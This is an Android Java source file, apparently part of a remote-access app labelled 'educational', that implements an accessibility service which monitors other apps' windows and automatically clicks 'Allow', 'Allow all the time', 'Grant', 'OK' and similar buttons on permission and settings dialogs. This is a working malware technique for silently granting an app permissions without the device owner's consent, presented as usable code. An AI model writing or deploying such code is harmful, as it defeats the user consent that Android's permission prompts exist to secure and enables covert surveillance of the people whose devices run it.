package com.remoteaccess.educational.permissions;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class AccessibilityHelperService extends AccessibilityService {

    private static AccessibilityHelperService instance;
    private static boolean isAutoClickEnabled = true;

    public static AccessibilityHelperService getInstance() {
        return instance;
    }

    public static void disableAutoClick() {
        isAutoClickEnabled = false;
    }

    public static void enableAutoClick() {
        isAutoClickEnabled = true;
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | 
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 100;
        
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (instance == null) instance = this;
        
        // Skip if auto-click is disabled
        if (!isAutoClickEnabled) return;
        
        String packageName = event.getPackageName() != null ? 
                           event.getPackageName().toString() : "";
        
        // Skip our own app
        if (packageName.equals(getPackageName())) {
            return;
        }
        
        // Auto-click permission dialogs
        autoClickPermissionDialogs(event);
    }

    private void autoClickPermissionDialogs(AccessibilityEvent event) {
        String className = event.getClassName() != null ? 
                         event.getClassName().toString() : "";
        
        if (className.contains("Permission") || 
            className.contains("GrantPermissions") ||
            className.contains("AlertDialog") ||
            className.contains("Com.android.settings") ||
            className.contains("RequestPermission")) {
            
            clickAllowButton();
        }
    }

    private void clickAllowButton() {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        if (findAndClickButton(rootNode, "Allow")) return;
        if (findAndClickButton(rootNode, "ALLOW")) return;
        if (findAndClickButton(rootNode, "Allow all the time")) return;
        if (findAndClickButton(rootNode, "Allow all the time and don't ask again")) return;
        if (findAndClickButton(rootNode, "Permit")) return;
        if (findAndClickButton(rootNode, "Grant")) return;
        if (findAndClickButton(rootNode, "Yes")) return;
        if (findAndClickButton(rootNode, "OK")) return;
        if (findAndClickButton(rootNode, "While using the app")) return;
        if (findAndClickButton(rootNode, "Only this time")) return;
        
        rootNode.recycle();
    }

    private boolean findAndClickButton(AccessibilityNodeInfo node, String text) {
        if (node == null) return false;

        if (node.isClickable() && node.getText() != null) {
            String nodeText = node.getText().toString();
            if (nodeText.contains(text)) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                return true;
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (findAndClickButton(child, text)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }

        return false;
    }

    @Override
    public void onInterrupt() {
        // Service interrupted
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
    }
}
